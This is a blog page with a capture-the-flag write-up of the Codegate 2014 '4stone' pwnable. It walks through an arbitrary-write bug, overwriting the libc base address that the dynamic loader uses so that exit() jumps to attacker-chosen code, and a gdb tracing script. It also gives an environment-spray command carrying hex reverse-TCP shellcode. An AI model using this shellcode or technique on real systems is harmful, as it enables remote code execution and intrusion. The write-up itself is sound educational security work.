@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Codegate 2k14 4stone (Pwnable 300) Write Up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In this level we are presented with a connect 4 game written with ncurses. After playing a couple of times we find a combination to win: DHHDLLDHDDDLDD
+Nothing happens though so lets fire up Hopper and take a look at the code. A good place to start is by analyzing the code around the you win and you lose exit strings and actually, after priting the you win string we can find an interesting piece of code before the call to exit()">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Codegate 2k14 4stone (Pwnable 300) Write Up">
+    <meta name="twitter:description" content="In this level we are presented with a connect 4 game written with ncurses. After playing a couple of times we find a combination to win: DHHDLLDHDDDLDD
+Nothing happens though so lets fire up Hopper and take a look at the code. A good place to start is by analyzing the code around the you win and you lose exit strings and actually, after priting the you win string we can find an interesting piece of code before the call to exit()">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Codegate 2k14 4stone (Pwnable 300) Write Up">
+  <meta property="og:description" content="In this level we are presented with a connect 4 game written with ncurses. After playing a couple of times we find a combination to win: DHHDLLDHDDDLDD
+Nothing happens though so lets fire up Hopper and take a look at the code. A good place to start is by analyzing the code around the you win and you lose exit strings and actually, after priting the you win string we can find an interesting piece of code before the call to exit()">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/03/23/codegate-2k14-4stone-pwnable-300-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/03/23/codegate-2k14-4stone-pwnable-300-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Codegate 2k14 4stone (Pwnable 300) Write Up</h1>
+      <p class="post-meta">@pwntester · Mar 23, 2014 · 6 min read</p>
+    </header>
+    <article class="post-content"><p>In this level we are presented with a connect 4 game written with ncurses. After playing a couple of times we find a combination to win: <code>DHHDLLDHDDDLDD</code></p>
+
+<p><img src="/images/octopress/4stone-6.png" alt="" />
+<img src="/images/octopress/4stone-4.png" alt="" /></p>
+
+<p>Nothing happens though so lets fire up Hopper and take a look at the code. A good place to start is by analyzing the code around the <strong>you win</strong> and <strong>you lose</strong> exit strings and actually, after priting the <strong>you win</strong> string we can find an interesting piece of code before the call to <code>exit()</code></p>
+
+<p><img src="/images/octopress/4stone-7.png" alt="" /></p>
+
+<p>If we decompile we can easily read what the code is doing:</p>
+
+<p><img src="/images/octopress/4stone-5.png" alt="" /></p>
+
+<p>If we win in 0 seconds, and the number or arguments passed to the program is 2 (the program and a first argument), then the first argument is converted into an unsigned long and with gdb we can see that <code>scanf(&quot;%x&quot;, 0xbffffab8)</code> is called, so we are writing whatever hexadecimal value we receive in <strong>stdin</strong> as an unsigned integer(4 bytes) in the stack. Then the program checks if the value read starts with <code>0x0804xxxx</code> or <code>0xbxxxxxxx</code> and if thats not the case, the value read from the first argument is stored in the address got from the <strong>stdin</strong>. So basically we have a 4 bytes write to any <em>arbitrary</em> address not starting with those prefixes.</p>
+
+<p>Lets check it. First we need to prepare a file with the combo needed to win in 0 seconds and the value we want to write in memory:</p>
+
+<p><img src="/images/octopress/4stone-8.png" alt="" /></p>
+
+<p>Now we need to run the program with an argument pointing to an address outside the restricted areas. If we look into the process memory mapping, we see that only a tiny portion of the heap is outside those addresses:</p>
+
+<p><img src="/images/octopress/4stone-9.png" alt="" /></p>
+
+<p>We can increase it by augmenting the stack area running <code>ulimit -s unlimited</code> effectively disabling ASLR:</p>
+
+<p><img src="/images/octopress/4stone-10.png" alt="" /></p>
+
+<p>Much better, now the only protected memory area are the stack and the binary. Too bad we cannot overwrite `exit@GOT since its going to be called right after the arbitrary 4 bytes write.</p>
+
+<p>For now we are going to write <code>0x41414141</code> in <code>0x4001f000</code> that has write permissions to verify the vulnerability.</p>
+
+<pre><code class="language-lang-bash">Breakpoint 2, 0x080498ac in ?? ()
+=&gt; 0x080498ac:  89 10   mov    DWORD PTR [eax],edx
+gdb-peda$ i r eax edx
+eax            0x4001f000       0x4001f000
+edx            0x41414141       0x41414141
+gdb-peda$ n
+gdb-peda$ x/x $eax
+0x4001f000:     0x41414141
+</code></pre>
+
+<p>Pretty cool!! but useless &hellip; so where and what to write??? The only code left to run is the call to <code>exit()</code> so we need a way to hijack that call and we cannot write to the <code>GOT</code>. Lets review what is going to happen when we reach the call to <code>exit()</code> and lets try to find a place to redirect the execution flow:</p>
+
+<ul>
+<li>The program calls <code>exit()</code> and jumps to <code>PLT</code></li>
+<li><code>PLT</code> jumps to the <code>GOT</code> but since the address has not being resolved yet, we jump to the dynamic loader to locate the address of <code>exit()</code> in libc and write the address to the <code>GOT</code> so we can effectively jump to the <code>exit()</code> code.</li>
+</ul>
+
+<p>In order to calculate the <code>exit()</code> address, the dynamic loader will check <code>libc</code> address and the offset of <code>exit()</code> in libc. If we can influence either the <strong>base</strong> or the <strong>offset</strong> we will be able to redirect the original call to any arbitrary location. If we are going to debug the dynamic loader, we better get ourselves some symbols.</p>
+
+<p><a href="http://dynofu.wikispaces.com/Tracing+Shared+Library+Call+Translation">We will need</a>:</p>
+
+<ul>
+<li>libc debug symbol: sudo apt-get install libc-dbg</li>
+<li>libc6 source: sudo apt-get source libc6*</li>
+</ul>
+
+<p>Don&rsquo;t know why but symbols for the loader need to be manually loaded. Adjust the <code>ld-linux</code> address and add these lines to a <code>gdb</code> script:</p>
+
+<pre><code class="language-lang-bash">show auto-solib-add
+add-symbol-file /usr/lib/debug/lib/i386-linux-gnu/ld-2.13.so 0x40000820
+directory /mnt/hgfs/Desktop/Codegate2k14/4stone/eglibc-2.13/elf
+sharedlibrary
+info sharedlibrary
+</code></pre>
+
+<p>Run gdb and check that <code>ld</code> symbols are loaded</p>
+
+<p><img src="/images/octopress/4stone-11.png" alt="" /></p>
+
+<p>We want to find out where the libc address or <code>exit</code> offset are stored so we can recognize them while tracing the loader resolution. These are the values we are looking for:</p>
+
+<p><img src="/images/octopress/4stone-19.png" alt="" /></p>
+
+<p>Ok, lets start the tracing. The first instruction in <code>ld-linux</code> is:</p>
+
+<p><img src="/images/octopress/4stone-14.png" alt="" /></p>
+
+<p>And look that, we even have comments!! ;) Ok, the <code>_dl_runtime_resolve</code> funcion doesn&rsquo;t look too scary:</p>
+
+<p><img src="/images/octopress/4stone-15.png" alt="" /></p>
+
+<p><code>_dl_fixup</code> is a different thing, but it has few calls and the second one to <code>_dl_lookup_symbol_x</code> looks promising.</p>
+
+<p><img src="/images/octopress/4stone-16.png" alt="" /></p>
+
+<p>As seen in the screenshot, right after the call <code>EAX</code> is updated with <code>0x40082000</code> which contains <code>0x40083000</code> the libc base address we were looking for. And if you go up to the process memory mapping, you will see that that address is writable!</p>
+
+<p>In this case we were lucky, the <code>libc</code> address pop up quite early, but I wrote this script to automate the task in case I had to trace deep in the loader guts:</p>
+
+<pre><code class="language-lang-python">import gdb
+import time
+
+gdb.execute(&quot;set python print-stack full&quot;, False, True)
+gdb.execute(&quot;set height 0&quot;, False)
+gdb.execute(&quot;show auto-solib-add&quot;, False)
+gdb.execute(&quot;add-symbol-file /usr/lib/debug/lib/i386-linux-gnu/ld-2.13.so 0x40000820&quot;, False)
+gdb.execute(&quot;directory /mnt/hgfs/Desktop/Codegate2k14/4stone/eglibc-2.13/elf&quot;, False)
+gdb.execute(&quot;sharedlibrary&quot;, False)
+
+# Set bp at 'call   0x8048710 &lt;_exit@plt&gt;'
+gdb.execute(&quot;break *0x%x&quot; % 0x80498b5, False)
+
+libc = &quot;40083000&quot;
+# Run binary
+gdb.execute(&quot;r 4001f000 &lt; combo&quot;, False, True)
+start_time = time.time()
+print &quot;[+] Tracing ... &quot;
+print &quot;[+] Looking for libc base address (0x40083000) ... &quot;
+
+while True:
+    try:
+        output = gdb.execute(&quot;context register&quot;, False, True)
+        if libc in output:
+            print output
+            print(&quot;[+] Found in: {0} seconds&quot;.format(str(time.time() - start_time)))
+            break
+        gdb.execute(&quot;si&quot;, False, True)
+    except gdb.error as detail:
+        if str(detail) == &quot;The program is not being run.&quot;:
+            break
+        print str(detail)
+</code></pre>
+
+<p>Running the tracer, we can quickly find the address where the libc base is stored:</p>
+
+<p><img src="/images/octopress/4stone-20.png" alt="" /></p>
+
+<p>OK, So <code>exit@GOT</code> is going to be updated with <code>libc_base + exit_offset</code>; we now control <code>libc</code> base, and we know the offset so if we want to redirect the execution flow, lets say that to <code>0x41414141</code> we have to overwrite the <code>libc</code> base address with <code>0x41414141 - 0xa1354 = 0x41372ded</code>. Let&rsquo;s try it, we will update the combo file with this value (so it is sent to the program via stdin) and call the executable with <code>0x40082000</code> as argument.</p>
+
+<p><img src="/images/octopress/4stone-17.png" alt="" /></p>
+
+<p>Sweet, we now control <code>EIP</code>!! But where should we jump?? We dont control any area in the stack and we cannot pass more arguments to the program, so the only thing we can do is a Environment variable Spray with a large NOP sled and a shellcode and then jump to a high address (<code>0xbff00000 + 0xa1354</code>) of the stack hoping to land in the NOP sled.</p>
+
+<p>Shellcode: reverse TCP connection to port 4444 on local machine:</p>
+
+<p><img src="/images/octopress/4stone-3.png" alt="" /></p>
+
+<p>Environment Spray:</p>
+
+<pre><code class="language-lang-bash">for i in $(seq 1 1024); do export payload$i=&quot;`python -c &quot;print '\x90'*2048+'\xbf\xdd\xc9\xc5\xd6\xd9\xc5\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x12\x83\xc0\x04\x31\x78\x0e\x03\xa5\xc7\x27\x23\x64\x03\x50\x2f\xd5\xf0\xcc\xda\xdb\x7f\x13\xaa\xbd\xb2\x54\x58\x18\xfd\x6a\x92\x1a\xb4\xed\xd5\x72\x38\x0e\x26\x83\xae\x0c\x26\x92\x72\x98\xc7\x24\xec\xca\x56\x17\x42\xe9\xd1\x76\x69\x6e\xb3\x10\x5d\x40\x47\x88\xc9\xb1\xc5\x21\x64\x47\xea\xe3\x2b\xde\x0c\xb3\xc7\x2d\x4e'&quot;`&quot;; done
+</code></pre>
+
+<p>Failed attempt:</p>
+
+<p><img src="/images/octopress/4stone-1.png" alt="" /></p>
+
+<p>aaaaand we got our shell:</p>
+
+<p><img src="/images/octopress/4stone-2.png" alt="" /></p>
+
+<p>Voila!!</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/pwnable"><span class="tag">Pwnable</span></a></li>
+        
+          <li><a href="/tags/ctf"><span class="tag">Ctf</span></a></li>
+        
+          <li><a href="/tags/codegate"><span class="tag">Codegate</span></a></li>
+        
+          <li><a href="/tags/loader"><span class="tag">Loader</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2041</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
